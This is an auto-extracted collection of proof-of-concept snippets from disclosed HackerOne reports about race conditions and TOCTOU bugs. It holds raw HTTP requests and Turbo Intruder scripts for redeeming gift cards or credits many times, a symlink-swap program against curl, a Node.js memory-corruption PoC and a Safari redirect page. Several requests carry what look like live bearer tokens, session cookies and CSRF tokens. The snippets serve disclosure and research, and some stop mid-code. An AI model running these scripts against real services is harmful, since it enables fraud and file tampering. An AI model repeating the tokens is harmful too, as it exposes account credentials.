# Race condition / TOCTOU — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #1438052 Race condition in faucet when using starport — cosmos — $5,000 — None
Source: `hackerone/reports/2022/1438052.md` (https://hackerone.com/reports/1438052)

```
accounts:
  - name: alice
    coins: ["0token", "200000000stake"]
  - name: bob
    coins: ["500token", "100000000stake"]
validator:
  name: alice
  staked: "100000000stake"
client:
  openapi:
    path: "docs/static/openapi.yml"
  vuex:
    path: "vue/src/store"
faucet:
  name: bob
  coins: ["5token", "100000stake"]  
  coins_max: ["11token", "100000stake"]
```

```
POST / HTTP/1.1
Host: 172.105.41.242:4500
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.105.41.242:4500/
Content-Type: application/json
Origin: http://172.105.41.242:4500
Content-Length: 63
Connection: close
{
  "address": "ALICE_ADDRESS"}
```

```
POST / HTTP/1.1
Host: 172.105.41.242:4500
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.105.41.242:4500/
Content-Type: application/json
Origin: http://172.105.41.242:4500
Content-Length: 63
Connection: close
{
  "address": "ALICE_ADDRESS"}

'''
```

## #2078571 [curl] CVE-2023-32001: fopen race condition — ibb — $2,480 — Time-of-check Time-of-use (TOCTOU) Race Condition
Source: `hackerone/reports/2023/2078571.md` (https://hackerone.com/reports/2078571)

```
  if(stat(filename, &sb) == -1 || !S_ISREG(sb.st_mode)) {
    /* a non-regular file, fallback to direct fopen() */
    *fh = fopen(filename, FOPEN_WRITETEXT);
...
}
...
```

```
#include <strings.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}
```

```
lrwxrwxrwx 1 selmelc selmelc     4 Jun 27 07:11 a -> flag
drwxrwxrwx 2 selmelc selmelc  4096 Jun 27 07:11 b
-rw-r--r-- 1 root    root        6 Jun 27 07:05 flag
-rwxr-x--- 1 selmelc selmelc 16608 Jun 27 07:04 rename
```

## #1540969 Race condition in joining CTF group — security — $500 — Time-of-check Time-of-use (TOCTOU) Race Condition
Source: `hackerone/reports/2023/1540969.md` (https://hackerone.com/reports/1540969)

```
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=100,
                           requestsPerConnection=100,
                           pipeline=True
                           )

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for i in range(30):
        engine.queue(target.req, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

```
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=100,
                           requestsPerConnection=100,
                           pipeline=True
                           )
```

```
    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for i in range(30):
        engine.queue(target.req, gate='race1')
```

## #974892 Race Condition of Transfer data Credits to Organization Leads to Add Extra free Data Credits to the Organization — helium — $250 — Business Logic Errors
Source: `hackerone/reports/2020/974892.md` (https://hackerone.com/reports/974892)

```
POST /api/data_credits/transfer_dc HTTP/1.1
Host: console.helium.com
Connection: close
Content-Length: 66
Accept: application/json, text/plain, */*
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IndsbXNzZUJDY01oSjdpQ3RjZ2wyeiJ9.eyJuaWNrbmFtZSI6ImVpc3NlbjVjKzIiLCJuYW1lIjoiZWlzc2VuNWMrMkB3ZWFyZWhhY2tlcm9uZS5jb20iLCJwaWN0dXJlIjoiaHR0cHM6Ly9zLmdyYXZhdGFyLmNvbS9hdmF0YXIvM2E1YTY3MjhlODkyN2YxYTgxYmJiZWQzY2I0MGI2OWI_cz00ODAmcj1wZyZkPWh0dHBzJTNBJTJGJTJGY2RuLmF1dGgwLmNvbSUyRmF2YXRhcnMlMkZlaS5wbmciLCJ1cGRhdGVkX2F0IjoiMjAyMC0wOS0wNFQxNzo1NDowNy4xMjFaIiwiZW1haWwiOiJlaXNzZW41YysyQHdlYXJlaGFja2Vyb25lLmNvbSIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJpc3MiOiJodHRwczovL2F1dGguaGVsaXVtLmNvbS8iLCJzdWIiOiJhdXRoMHw1ZjUyN2YwYTMzYzBhMjAwNmQ1OTJjNDkiLCJhdWQiOiJiSGx0N043MEhPVHFZSkJ2R2NvbjFsQVJGcDc4WFczMyIsImlhdCI6MTU5OTI0MjI0NCwiZXhwIjoxNTk5Mjc4MjQ0LCJub25jZSI6InJhQ25sSE1kM1o4cERManNORUt0Rk80R2ZBZlRkUDdfUkIyWXRGNTB4MlcifQ.LdiVe8woYQ9nKky6s9x0AdcH75gf0lrSqO9wWhTW6aD38VDesRgZQZcopvKWwltdv0g6cfd0qSc0NOXSTJU-YCxnM_SmTwQdzz_w7t3tdj4H4NPMgxvk7Wi0Q0Ot5gnBFy-Hs43kNq_6JgON2fdOd3ANxTPyKo10sp_z_9I6XoPydUKl0vWOqCAAtqWY09yKnsAcUOiKAvwlToyRPpyzb0CiB2CkITgXRpq5I5dkx0MSikgfOtbMgHwXIwyR4221VaU9quZ21gHCj5h_b-eS5ZDK8c5lqrjheNHv0hSSquDOUJ-PJuZIXmdzthC4nDNUXFr56h5yBxdwvz14mF-xIQ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
organization: 9eda512e-7d7b-4884-95a1-05289cd0986f
Content-Type: application/json
Origin: https://console.helium
```

```
POST /api/data_credits/transfer_dc HTTP/1.1
Host: console.helium.com
Connection: close
Content-Length: 66
Accept: application/json, text/plain, */*
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IndsbXNzZUJDY01oSjdpQ3RjZ2wyeiJ9.eyJuaWNrbmFtZSI6ImVpc3NlbjVjKzIiLCJuYW1lIjoiZWlzc2VuNWMrMkB3ZWFyZWhhY2tlcm9uZS5jb20iLCJwaWN0dXJlIjoiaHR0cHM6Ly9zLmdyYXZhdGFyLmNvbS9hdmF0YXIvM2E1YTY3MjhlODkyN2YxYTgxYmJiZWQzY2I0MGI2OWI_cz00ODAmcj1wZyZkPWh0dHBzJTNBJTJGJTJGY2RuLmF1dGgwLmNvbSUyRmF2YXRhcnMlMkZlaS5wbmciLCJ1cGRhdGVkX2F0IjoiMjAyMC0wOS0wNFQxNzo1NDowNy4xMjFaIiwiZW1haWwiOiJlaXNzZW41YysyQHdlYXJlaGFja2Vyb25lLmNvbSIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJpc3MiOiJodHRwczovL2F1dGguaGVsaXVtLmNvbS8iLCJzdWIiOiJhdXRoMHw1ZjUyN2YwYTMzYzBhMjAwNmQ1OTJjNDkiLCJhdWQiOiJiSGx0N043MEhPVHFZSkJ2R2NvbjFsQVJGcDc4WFczMyIsImlhdCI6MTU5OTI0MjI0NCwiZXhwIjoxNTk5Mjc4MjQ0LCJub25jZSI6InJhQ25sSE1kM1o4cERManNORUt0Rk80R2ZBZlRkUDdfUkIyWXRGNTB4MlcifQ.LdiVe8woYQ9nKky6s9x0AdcH75gf0lrSqO9wWhTW6aD38VDesRgZQZcopvKWwltdv0g6cfd0qSc0NOXSTJU-YCxnM_SmTwQdzz_w7t3tdj4H4NPMgxvk7Wi0Q0Ot5gnBFy-Hs43kNq_6JgON2fdOd3ANxTPyKo10sp_z_9I6XoPydUKl0vWOqCAAtqWY09yKnsAcUOiKAvwlToyRPpyzb0CiB2CkITgXRpq5I5dkx0MSikgfOtbMgHwXIwyR4221VaU9quZ21gHCj5h_b-eS5ZDK8c5lqrjheNHv0hSSquDOUJ-PJuZIXmdzthC4nDNUXFr56h5yBxdwvz14mF-xIQ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
organization: 9eda512e-7d7b-4884-95a1-05289cd0986f
Content-Type: application/json
Origin: https://console.helium
```

## #759247 Race Condition allows to redeem multiple times gift cards which leads to free "money" — reverb — - — Business Logic Errors
Source: `hackerone/reports/2020/759247.md` (https://hackerone.com/reports/759247)

```
POST /fi/redeem HTTP/1.1
Host: sandbox.reverb.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://sandbox.reverb.com/fi/redeem
Content-Type: application/x-www-form-urlencoded
Content-Length: 176
Connection: keep-alive
Cookie: <cookies>

utf8=%E2%9C%93&authenticity_token=<CSRF token>&token=<GIFT card>&commit=Redeem+Now
```

```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False
                           )

   for i in range(30):
	engine.queue(target.req, i)
        engine.queue(target.req, target.baseInput, gate='race1')


    engine.start(timeout=5)
   engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
	table.add(req)
```

```
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False
                           )
```

## #381356 Client-Side Race Condition using Marketo, allows sending user to data-protocol in Safari when form without onSuccess is submitted on www.hackerone.com — security — - — Business Logic Errors
Source: `hackerone/reports/2019/381356.md` (https://hackerone.com/reports/381356)

```
      form.onSuccess(function() {
        return false;
      }); 
```

```
      if (location.pathname == "/product/response") {
        $('#mktoForm_1013 .mktoHtmlText p').text('Want to get up and running with HackerOne Response? Give us a few details and we’ll be in touch shortly!');
      }
      else if (location.pathname == "/product/bounty") {
        $('#mktoForm_1013 .mktoHtmlText p').text('Want to tap into the ultimate level of hacker-powered security with HackerOne Bounty? Give us a few details and we’ll be in touch shortly!');
      }
      else if (location.pathname == "/product/challenge") {
        $('#mktoForm_1013 .mktoHtmlText p').text('Up for a HackerOne Challenge? Want to learn more? Give us a few details and we’ll be in touch shortly!');
      }
      else if (location.pathname == "/services") {
        $('#mktoForm_1013 .mktoHtmlText p').text("We're looking forward to serving you. Give us a few details and we’ll be in touch shortly!");
      }
      else if (location.pathname == "/") {
        $('#mktoForm_1013 .mktoHtmlText p').text("Start uncovering critical vulnerabilities today. Give us a few details and we’ll be in touch shortly!");
      }
```

```
<html>
<head>
<script>
var b;
function doit() {
	setInterval(function() {
		b.postMessage('{"mktoResponse":{"for":"mktoFormMessage0","error":false,"data":{"formId":"1013","followUpUrl":"data:text/html;base64,PGhlYWQ+PGxpbmsgcmVsPXN0eWxlc2hlZXQgbWVkaWE9YWxsIGhyZWY9aHR0cHM6Ly9oYWNrZXJvbmUuY29tL2Fzc2V0cy9mcm9udGVuZC4wMjAwMjhlOTU1YTg5Zjg1YTVmYzUyMWVhYzMxMDM2OC5jc3MgLz48bGluayByZWw9c3R5bGVzaGVldCBtZWRpYT1hbGwgaHJlZj1odHRwczovL2hhY2tlcm9uZS5jb20vYXNzZXRzL3ZlbmRvci1iZmRlMjkzYTUwOTEzYTA5NWQ4Y2RlOTcwZWE1YzFlNGEzNTI0M2NjNzY3NWI2Mjg2YTJmM2Y3MDI2ZmY1ZTEwLmNzcz48L2hlYWQ+PGJvZHk+PGRpdiBjbGFzcz0iYWxlcnRzIj4KPC9kaXY+PGRpdiBjbGFzcz0ianMtYXBwbGljYXRpb24tcm9vdCBmdWxsLXNpemUiPjxzcGFuIGRhdGEtcmVhY3Ryb290PSIiPjxkaXYgY2xhc3M9ImZ1bGwtc2l6ZSBhcHBsaWNhdGlvbl9mdWxsX3dpZHRoX2xheW91dCI+PGRpdj48ZGl2PjxkaXYgY2xhc3M9InRvcGJhci1zaWduZWQtb3V0Ij48ZGl2IGNsYXNzPSJpbm5lci1jb250YWluZXIiPjxkaXY+PGEgY2xhc3M9ImFwcF9fbG9nbyIgaHJlZj0iLyI+PGltZyBzcmM9Imh0dHBzOi8vaGFja2Vyb25lLmNvbS9hc3NldHMvc3RhdGljL2ludmVydGVkX2xvZ28tYzA0MzBhZjgucG5nIiBhbHQ9IkhhY2tlck9uZSI+PC9hPjxkaXYgY2xhc3M9InRvcGJhci10b2dnbGUiPjxpIGNsYXNzPSJpY29uLWhhbWJ1cmdlciI+PC9pPjwvZGl2PjwvZGl2PjxkaXYgY2xhc3M9InRvcGJhci1zdWJuYXYtd3JhcHBlciI+PHVsIGNsYXNzPSJ0b3BiYXItc3VibmF2Ij48bGkgY2xhc3M9InRvcGJhci1zdWJuYXYtaXRlbSI+PGEgY2xhc3M9InRvcGJhci1zdWJuYXYtbGluayIgaHJlZj0iL3VzZXJzL3NpZ25faW4iPlNpZ24gSW48L2E+Jm5ic3A7fCZuYnNwOzwvbGk+PGxpIGNsYXNzPSJ0b3BiYXItc3VibmF2LWl0ZW0iPjxhIGNsYXNzPSJ0b3BiYXItc3VibmF2LWxpbmsiIGhyZWY9Ii91c2Vycy9zaWduX3VwIj5TaWduIFVwPC9hPjwvbGk+PC91bD48L2Rp
```

## #604534 Race Condition leads to undeletable group member — security — - — Time-of-check Time-of-use (TOCTOU) Race Condition
Source: `hackerone/reports/2020/604534.md` (https://hackerone.com/reports/604534)

```
POST /group/post_join HTTP/1.1
Host: ctf.hacker101.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ctf.hacker101.com/group/join?invite=bb5c42ab578b12c63e5d868b3e03816c8c45597262aaf095ca2be19116b8fd0a
Content-Type: application/x-www-form-urlencoded
Content-Length: 109
Connection: close
Cookie: COOKIES
Upgrade-Insecure-Requests: 1

csrf=391aecf0c3125e90c437d04c18204ab6&invite=bb5c42ab578b12c63e5d868b3e03816c8c45597262aaf095ca2be19116b8fd0a
```

## #927384 Race Condition when following a user — stagingdoteverydotorg — - — Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')
Source: `hackerone/reports/2020/927384.md` (https://hackerone.com/reports/927384)

```
def queueRequests(target, wordlists):
        engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )

        for i in range(30):
            engine.queue(target.req, str(i), gate='race1')

        engine.openGate('race1')
        engine.complete(timeout=60)
def handleResponse(req, interesting):
        table.add(req)
       
```

```
        engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )
```

```
        for i in range(30):
            engine.queue(target.req, str(i), gate='race1')
```

## #1037430 Race Condition on "Get free Badoo Premium" which allows to get more days of free premium for Free.  — bumble — - — None
Source: `hackerone/reports/2020/1037430.md` (https://hackerone.com/reports/1037430)

```
POST /webapi.phtml?SERVER_PROMO_ACCEPTED HTTP/1.1
Host: eu1.badoo.com
Connection: close
Content-Length: 190
X-Session-id: s1:77:████
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
X-Message-type: 402
X-User-id: █████████
Content-Type: json
Accept: */*
Origin: https://eu1.badoo.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://eu1.badoo.com/settings
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie:  {cookie here}

{"$gpb":"badoo.bma.BadooMessage","body":[{"message_type":402,"p_string":{"value":"delete_account_trial_spp_new_flow"}}],"message_id":101,"message_type":402,"version":1,"is_background":false}
```

## #488985 Race condition in claiming program credentials  — security — - — Time-of-check Time-of-use (TOCTOU) Race Condition
Source: `hackerone/reports/2019/488985.md` (https://hackerone.com/reports/488985)

```
POST /graphql HTTP/1.1
Host: hackerone.com
Connection: close
Content-Length: 778
Accept: */*
X-Auth-Token: ████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Origin: https://hackerone.com
Content-Type: application/json
Referer: https://hackerone.com/█████
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,he;q=0.8
Cookie: __cfduid=███████; _cfuid=███████; _ga=████; _mkto_trk=id:████████

{"query":"mutation Claim_credential_mutation($input_0:ClaimCredentialInput!,$types_1:[ErrorTypeEnum]!,$first_2:Int!) {claimCredential(input:$input_0) {clientMutationId,...F4,...F5}} fragment F0 on Team {id,claimed_credential {credentials,account_details,id}} fragment F1 on Node {id} fragment F2 on ResourceInterface {...F0,...F1} fragment F3 on Team {id} fragment F4 on ClaimCredentialPayload {team {id,...F2,...F3}} fragment F5 on ClaimCredentialPayload {team {claimed_credential {id},id},was_successful,_errors4fkckF:errors(types:$types_1,first:$first_2) {edges {node {type,field,message,id},cursor},pageInfo {hasNextPage,hasPreviousPage}}}","variables":{"input_0":{"team_id":"█████=","clientMutationId":"1"},"types_1":"ARGUMENT","first_2":100}}
```

```
{"data":{"claimCredential":{"clientMutationId":"1","team":{"claimed_credential":{"id":"██████████","credentials":{"email":"██████","password":"███████","private_id":"██████"},"account_details":null},"id":"██████="},"was_successful":false,"_errors4fkckF":{"edges":[],"pageInfo":{"hasNextPage":false,"hasPreviousPage":false}}}}}
```

```
{"data":{"claimCredential":{"clientMutationId":"1","team":{"claimed_credential":{"id":"███████","credentials":{"email":"████████","password":"███████","private_id":"███"},"account_details":null},"id":"██████████="},"was_successful":true,"_errors4fkckF":{"edges":[],"pageInfo":{"hasNextPage":false,"hasPreviousPage":false}}}}}
```

## #1913309 Race condition leads to add more than 5 email at Data breaches monitor system at https://stage.firefoxmonitor.nonprod.cloudops.mozgcp.net — mozilla — - — Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')
Source: `hackerone/reports/2024/1913309.md` (https://hackerone.com/reports/1913309)

```
POST /api/v1/user/email HTTP/2
Host: stage.firefoxmonitor.nonprod.cloudops.mozgcp.net
Cookie: connect.sid=█████; _ga_CXG8K4KW4P=GS1.1.1679333065.1.1.1679336292.0.0.0; _ga=GA1.1.518394987.1679333065
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://stage.firefoxmonitor.nonprod.cloudops.mozgcp.net/user/settings
Content-Type: application/json
X-Csrf-Token: 0787d9f55701a244aa8f68401f2dc6aebb55a1b83ee2930743ba1324314b5c2cb87fafa7bac74afd8d4660feff2ce33d5b38fb949478c5b9f32430e863ced6b4
Content-Length: 33
Origin: https://stage.firefoxmonitor.nonprod.cloudops.mozgcp.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: same-origin
Sec-Fetch-Site: same-origin
X-Pwnfox-Color: blue
Te: trailers

{"email":"████████"}
```

## #3747959 curl --skip-existing has a TOCTOU race that lets a post-check symlink redirect the later download write — curl — - — Time-of-check Time-of-use (TOCTOU) Race Condition
Source: `hackerone/reports/2026/3747959.md` (https://hackerone.com/reports/3747959)

```
set -euo pipefail

ROOT="$PWD"
CURL_BIN=""
for candidate in "$ROOT/src/curl" "$ROOT/build-h2-asan/src/curl" "$(command -v curl)"; do
  if [ -n "${candidate:-}" ] && [ -x "$candidate" ]; then
    CURL_BIN="$candidate"
    break
  fi
done
if [ -z "$CURL_BIN" ]; then
  echo "could not find a curl binary to test" >&2
  exit 1
fi

TMPDIR="$(mktemp -d)"
trap 'jobs -p | xargs -r kill 2>/dev/null || true; rm -rf "$TMPDIR"' EXIT
SHARED="$TMPDIR/shared"
TARGET="$TMPDIR/target"
SIGNAL="$TMPDIR/signal"
mkdir -p "$SHARED" "$TARGET" "$SIGNAL"
chmod 1777 "$SHARED"
printf 'ORIGINAL\n' > "$TARGET/important.txt"

cat >"$TMPDIR/server.py" <<'PY'
import os
import sys
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

port_file, ready_file, go_file = sys.argv[1:4]

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path != "/payload.txt":
            self.send_response(404)
            self.end_headers()
            return
        open(ready_file, "w").close()
        while not os.path.exists(go_file):
            time.sleep(0.02)
        body = b"RACED-SKIP-EXISTING\n"
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass

server = HTTPServer(("127.0.0.1", 0), Handler)
with open(port_file, "w", encoding="ascii") as f:
    f.write(str(server.server_port))
    f.flush()
server.serve_forever()
PY

python3 -u "$T
```

```
    def do_GET(self):
        if self.path != "/payload.txt":
            self.send_response(404)
            self.end_headers()
            return
        open(ready_file, "w").close()
        while not os.path.exists(go_file):
            time.sleep(0.02)
        body = b"RACED-SKIP-EXISTING\n"
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
```

```
    def log_message(self, *args):
        pass
```

## #183837 Race condition in up voting and down voting — urbandictionary — - — Violation of Secure Design Principles
Source: `hackerone/reports/2023/183837.md` (https://hackerone.com/reports/183837)

```
GET /v0/vote?defid=3889203&direction=up&key=ab71d33b15d36506acf1e379b0ed07ee HTTP/1.1
Host: api.urbandictionary.com
Cache-Control: max-age=0
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://www.urbandictionary.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36
Referer: http://www.urbandictionary.com/define.php?term=alicia
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-US,en;q=0.8
Connection: close

as a response I got the following responses:
```

## #3248712 Not a Vuln: Race Condition Allows Creation of Multiple Organizations with the Same Name — wakatime — - — Business Logic Errors
Source: `hackerone/reports/2025/3248712.md` (https://hackerone.com/reports/3248712)

```
POST /settings/orgs/new HTTP/2
Host: wakatime.com
Cookie: csrftoken=c25cc215f903abf846b48d367d927846cef87dfdf937fb24a5ea5608a5a4ac55; session=.eJxNkctqKzEMhvd9ijLrGuSrrHmOrroZZFk-HZpkwJOBQsm710nOgbOz9V_0Gf-8vL5OS-u6f07ztR_69hisdZqnCjUn66pn5KrimzI3jR48EykkiN5yRhcgZCVfmvOSSk2cbXUh0AjUVoWa4l0uUMhjULKtKqgFbBAUke9-wcAgzmvKHAhtZZLpyXLs2p9AFEodSM5ES2TGAmeyZjFlBFwEaLHGZ0j23q7bl15GSlwUcTY2GuCl5ZBKyNUnrORw3ERbxgHaBl0rLnBUjgkyRw4s8W-jfjccXiJKhjEWE0oGQz4VU1PhEGyK3sM0_wz3nWBsduCiATQW3m2aAecIH4-2oV-HztM43_7VP55o2SZUm4xTO3ZgzCZTyQbFl-RQAoB7Aq37Itulrf286JnX0yKnbdf63y9uff2zdG3au_Zpvhyn02N-XM_Lvh1ddB-4t5fbL91QjFs.aHGhqQ.8Gxi0UY4hovSw40rLf4uXSR0gyg; ?????????; github_csrf_token=c2cc079fb1ba0e7be7439ab9d84d11aa; remember_token=94bdd862-5199-4932-8e8c-b9712500f5d5|45aaa269d747d5c764973ad9397758e1e36e8f308fdb6cff4f934e85dad66ba73a0914e77fe2164d926b37b59e6ecc475669ab40326b91bbd5a0abfa6fe34976
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://wakatime.com/settings/orgs/new
Content-Type: application/x-www-form-urlencoded
Content-Length: 85
Origin: https://wakatime.com
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrftoken=c25cc215f903abf846b48d367d927846cef87dfdf937fb24a5ea5608a5a4ac55&name=ctrl
```

```
POST /settings/orgs/new HTTP/2
Host: wakatime.com
Cookie: csrftoken=c25cc215f903abf846b48d367d927846cef87dfdf937fb24a5ea5608a5a4ac55; session=.eJxNkctqKzEMhvd9ijLrGuSrrHmOrroZZFk-HZpkwJOBQsm710nOgbOz9V_0Gf-8vL5OS-u6f07ztR_69hisdZqnCjUn66pn5KrimzI3jR48EykkiN5yRhcgZCVfmvOSSk2cbXUh0AjUVoWa4l0uUMhjULKtKqgFbBAUke9-wcAgzmvKHAhtZZLpyXLs2p9AFEodSM5ES2TGAmeyZjFlBFwEaLHGZ0j23q7bl15GSlwUcTY2GuCl5ZBKyNUnrORw3ERbxgHaBl0rLnBUjgkyRw4s8W-jfjccXiJKhjEWE0oGQz4VU1PhEGyK3sM0_wz3nWBsduCiATQW3m2aAecIH4-2oV-HztM43_7VP55o2SZUm4xTO3ZgzCZTyQbFl-RQAoB7Aq37Itulrf286JnX0yKnbdf63y9uff2zdG3au_Zpvhyn02N-XM_Lvh1ddB-4t5fbL91QjFs.aHGhqQ.8Gxi0UY4hovSw40rLf4uXSR0gyg; ?????????; github_csrf_token=c2cc079fb1ba0e7be7439ab9d84d11aa; remember_token=94bdd862-5199-4932-8e8c-b9712500f5d5|45aaa269d747d5c764973ad9397758e1e36e8f308fdb6cff4f934e85dad66ba73a0914e77fe2164d926b37b59e6ecc475669ab40326b91bbd5a0abfa6fe34976
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://wakatime.com/settings/orgs/new
Content-Type: application/x-www-form-urlencoded
Content-Length: 85
Origin: https://wakatime.com
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrftoken=c25cc215f903abf846b48d367d927846cef87dfdf937fb24a5ea5608a5a4ac55&name=ctrl
```

## #3752489 Memory Corruption via TOCTOU Race in SharedArrayBuffer UTF-8 Decode (`StringBytes::Encode`) — nodejs — - — Time-of-check Time-of-use (TOCTOU) Race Condition
Source: `hackerone/reports/2026/3752489.md` (https://hackerone.com/reports/3752489)

```
if (buflen >= 32 && simdutf::validate_utf8(buf, buflen)) {       // T1: validates shared data
  size_t u16size = simdutf::utf16_length_from_utf8(buf, buflen);  // T2: calculates size
  return EncodeTwoByteString(
      isolate, u16size, [buf, buflen, u16size](uint16_t* dst) {
        size_t written = simdutf::convert_valid_utf8_to_utf16(     // T3: converts (ASSUMES VALID!)
            buf, buflen, reinterpret_cast<char16_t*>(dst));
        CHECK_EQ(written, u16size);                                // May fail or OOB already done
      });
}
```

```
/**
 * PoC: TOCTOU Race Condition in UTF-8 Decode with SharedArrayBuffer
 *
 * Demonstrates memory corruption via a race condition in StringBytes::Encode.
 * When processing SharedArrayBuffer data as UTF-8:
 * 1. simdutf::validate_utf8() validates the data
 * 2. simdutf::utf16_length_from_utf8() calculates output size
 * 3. simdutf::convert_valid_utf8_to_utf16() converts (assumes valid!)
 *
 * Between steps 1-3, a Worker thread modifies the shared memory,
 * violating the "valid UTF-8" assumption and causing OOB writes.
 *
 * Impact: Process crash (SIGSEGV), potential OOB read/write
 *
 * WARNING: This PoC WILL crash the Node.js process!
 */

import { Worker, isMainThread, workerData } from 'node:worker_threads';

if (isMainThread) {
  // Create shared memory accessible by both main thread and worker
  const sharedBuffer = new SharedArrayBuffer(4096);
  const view = new Uint8Array(sharedBuffer);

  // Fill with valid multi-byte UTF-8 sequences (3-byte chars: U+4000 range)
  // 3-byte sequences: 0xE4 0xB8 0x80 (valid UTF-8 for U+4E00 "一")
  for (let i = 0; i < view.length - 2; i += 3) {
    view[i] = 0xE4;     // First byte of 3-byte sequence
    view[i + 1] = 0xB8; // Valid continuation byte (10xxxxxx)
    view[i + 2] = 0x80; // Valid continuation byte (10xxxxxx)
  }

  // Spawn worker that continuously corrupts the shared memory
  const worker = new Worker(new URL(import.meta.url), {
    workerData: sharedBuffer
  });

  let iterations = 0;
  const maxIterations = 100000;

 
```

```
node poc_sharedarraybuffer_toctou.mjs
```

## #187134 JSBeautifier BApp: Race condition leads to memory disclosure — portswigger — - — Memory Corruption - Generic
Source: `hackerone/reports/2016/187134.md` (https://hackerone.com/reports/187134)

```
HTTP/1.1 200 OK
Content-Length: -12000
Meta:%s:%d
Content-Type: text/html

<![a-z0-9]{1024}>
```

```
